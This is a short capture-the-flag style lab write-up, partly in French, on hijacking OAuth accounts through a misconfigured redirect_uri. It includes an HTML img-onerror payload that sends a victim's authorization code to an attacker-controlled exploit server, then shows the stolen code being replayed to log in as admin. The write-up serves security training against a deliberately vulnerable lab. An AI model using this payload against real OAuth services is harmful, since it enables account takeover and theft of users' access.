# OAuth account hijacking via redirect_uri
```
 This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter. 
```

- Connexion au SSO avec l'identifiant donné dans la description

- Interception de la requête d'authentification au SSO :

```
GET /auth?client_id=mpti5olfiyjexjzmgwnef&redirect_uri=https://0a3100d6048483a882560b4100bf0071.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```

- On modifie l'argument `redirect_uri` afin qu'il pointe vers notre serveur d'exploitation

### Création payload à envoyer depuis le serveur d'exploit :

```html
<img src="xmco" onerror="document.location='https://oauth-0ab600e904a083158285096f020900ab.oauth-server.net/auth?client_id=mpti5olfiyjexjzmgwnef&redirect_uri=https://exploit-0a0f0044042183bd82d60a2a01a800ad.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email'"/>
```

- On récupère le code sur notre serveur d'exploitation et on l'utilise pour se connecter :

```
https://0a3100d6048483a882560b4100bf0071.web-security-academy.net/oauth-callback?code=-fgQrB0vxufMPtruLw23dOIPAE7Akva7lpF1tQIt-u5
```


> SOLVED : GG WP ! :) 